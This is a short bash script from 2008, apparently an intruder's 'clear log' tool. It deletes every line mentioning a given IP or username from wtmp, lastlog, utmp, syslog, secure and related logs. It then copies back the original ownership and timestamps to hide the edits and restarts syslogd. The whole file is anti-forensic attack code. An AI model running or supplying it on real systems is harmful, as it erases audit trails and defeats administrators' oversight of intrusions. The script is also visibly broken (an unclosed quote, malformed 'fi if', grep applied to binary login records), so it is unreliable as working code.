#!/bin/bash
echo " linux clear log "
echo " by knlve 2008-08-29"
echo "==============================="
# chmod 777 log
# ./log xx.xx.xx.xx And ./log root
if [ -f "/var/log/wtmp" ];then
cat /var/log/wtmp | grep -v $1 >> /var/log/temp1;
chgrp --reference /var/log/wtmp /var/log/temp1;
chown --reference /var/log/wtmp /var/log/temp1;
touch -r /var/log/wtmp /var/log/temp1;
mv -f /var/log/temp1 /var/log/wtmp;
fi
if [ -f "/var/log/lastlog" ];then
cat /var/log/lastlog |grep -v $1 >> /var/log/temp2;
chgrp --reference /var/log/lastlog /var/log/temp2;
chown --reference /var/log/lastlog /var/log/temp2;
touch -r /var/log/lastlog /var/log/temp2;
mv -f /var/log/temp2 /var/log/lastlog;
fi
if [ -f "/var/log/messages" ];then
cat /var/log/messages | grep -v $1 >> /var/log/temp3;
chgrp --reference /var/log/messages /var/log/temp3;
chown --reference /var/log/messages /var/log/temp3;
touch -r /var/log/messages /var/log/temp3;
mv -f /var/log/temp3 /var/log/messages;
fi
if [ -f "/var/log/utmp" ];then
cat /var/log/utmp | grep -v $1 >> /var/log/temp4;
chgrp --reference /var/log/utmp /var/log/temp4;
chown --reference /var/log/utmp /var/log/temp4;
touch -r /var/log/utmp /var/log/temp4;
mv -f /var/log/temp4 /var/log/utmp;
fi
if [ -f "/var/log/wtmpx" ];then
cat /var/log/wtmpx | grep -v $1 >> /var/log/temp5;
chgrp --reference /var/log/wtmpx /var/log/temp5;
chown --reference /var/log/wtmpx /var/log/temp5;
touch -r /var/log/wtmpx /var/log/temp5;
mv -f /var/log/temp5 /var/log/wtmpx;
fi if [ -f "/var/log/utmpx" ];then
cat /var/log/utmpx | grep -v $1 >> /var/log/temp6;
chgrp --reference /var/log/utmpx /var/log/temp6;
chown --reference /var/log/utmpx /var/log/temp6;
touch -r /var/log/utmpx /var/log/temp6;
mv -f /var/log/temp6 /var/log/utmpx;
fi
if [ -f "/var/log/syslog" ];then
cat /var/log/syslog | grep -v $1 >> /var/log/temp7;
chgrp --reference /var/log/syslog /var/log/temp7;
chown --reference /var/log/syslog /var/log/temp7;
touch -r /var/log/syslog /var/log/temp7;
mv -f /var/log/temp7 /var/log/syslog;
fi
if [ -f "/var/log/secure" ];then
cat /var/log/secure | grep -v $1 >> /var/log/temp8;
chgrp --reference /var/log/secure /var/log/temp8;
chown --reference /var/log/secure /var/log/temp8;
touch -r /var/log/secure /var/log/temp8;
mv -f /var/log/temp8 /var/log/secure;
fi
/usr/bin/killall -HUP syslogd;
echo "Clear log is success!
#rm -fr log
